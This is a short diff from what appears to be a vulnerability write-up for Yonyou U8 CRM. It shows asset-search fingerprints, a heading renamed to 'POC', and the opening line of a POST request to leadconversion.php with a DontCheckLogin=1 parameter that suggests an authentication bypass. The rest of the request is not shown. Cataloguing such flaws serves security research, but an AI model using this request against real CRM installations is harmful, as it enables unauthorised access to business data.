@@ -14,7 +14,7 @@ app.name="用友 CRM"
 title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
